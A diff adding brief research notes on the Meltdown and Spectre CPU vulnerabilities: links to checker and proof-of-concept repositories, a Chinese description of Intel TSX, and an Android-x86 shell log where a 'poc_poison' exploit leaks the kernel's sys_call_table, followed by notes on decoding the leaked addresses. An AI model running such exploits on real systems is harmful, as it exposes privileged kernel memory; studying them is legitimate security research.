@@ -1,0 +1,47 @@
+meltdown and spectre
+
+meltdown
+
+https://github.com/raphaelsc/Am-I-affected-by-Meltdown
+https://github.com/paboldin/meltdown-exploit
+
+spectre
+https://github.com/Eugnis/spectre-attack
+https://github.com/mniip/spectre-meltdown-poc
+
+https://github.com/speed47/spectre-meltdown-checker
+https://github.com/lsds/spectre-attack-sgx
+================================================================================
+TSX (transactional memory)
+事务性数据同步扩展指令集
+TSX将允许程序员指定事务型同步代码空间，使得目前使用粗粒度线程锁定（Coarse-grained
+thread lock）的程序更自由地使用细粒度线程锁定（Fine-grained thread
+lock），进而提高多线程效率和性能。
+
+================================================================================
+androidia_64:/data/poc # grep 'sys_call_table' /proc/kallsyms
+ffffffff9d600200 R sys_call_table
+ffffffff9d6015c0 R ia32_sys_call_table
+androidia_64:/data/poc # ./poc_poison ffffffff9d600200
+cutoff: 100
+0xffffffff9d600200 | 1d c6 db 9c ff ff ff ff c8 c6 db 9c ff ff ff ff
+0 ff
+0xffffffff9d600210 | 06 9f db 9c ff ff ff ff 2b 8d db 9c ff ff ff ff
+0 ff
+0xffffffff9d600220 | f9 0c dc 9c ff ff ff ff 4e 0e dc 9c ff ff ff ff
+0 ff
+0xffffffff9d600230 | 6e 0d dc 9c ff ff ff ff 32 01 dd 9c ff ff ff ff
+0 ff
+0xffffffff9d600240 | 2d ad db 9c ff 00 ff ff 93 b2 c1 9c ff ff ff ff
+0 ff
+0xffffffff9d600250 | ac fa d9 9c ff ff ff ff 78 e1 d9 9c ff ff ff ff
+0 ff
+0xffffffff9d600260 |   8.800753199982e-09 00^C
+130|androidia_64:/data/poc # grep 'ffffffff9cdbc61d' /proc/kallsyms
+ffffffff9cdbc61d T SyS_read
+ffffffff9cdbc61d T sys_read
+
+----
+64bit, 8 bytes, 倒着写，在kallsyms搜索对应的系统调用地址。
+sys_call_table 中保存的是系统调用的地址.
+
